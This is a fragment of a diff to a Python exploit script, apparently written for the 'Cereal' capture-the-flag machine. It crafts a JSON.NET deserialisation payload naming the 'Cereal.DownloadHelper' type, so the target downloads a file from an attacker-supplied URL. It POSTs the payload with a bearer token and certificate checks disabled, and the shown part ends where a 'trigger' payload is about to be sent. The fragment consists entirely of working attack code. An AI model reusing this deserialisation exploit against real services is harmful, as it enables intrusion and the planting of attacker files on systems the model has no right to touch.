@@ -27,9 +27,9 @@ base_headers = {"Content-Type": "application/json", "Authorization": "Bearer {}"
 download_url = "https://{}/test.txt".format(ip)
 print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))
 
-target_json = {"JSON":{"$type":"Cereal.DownloadHelper, Cereal","URL": download_url,"FilePath":"test.txt"}}
+target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"
 
-targetResp = requests.post(base_url, json=target_json, headers=base_headers, verify=False)
+targetResp = requests.post(base_url, data=target_json_string, headers=base_headers, verify=False)
 print("Response Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))
 
 # POST the trigger cereal
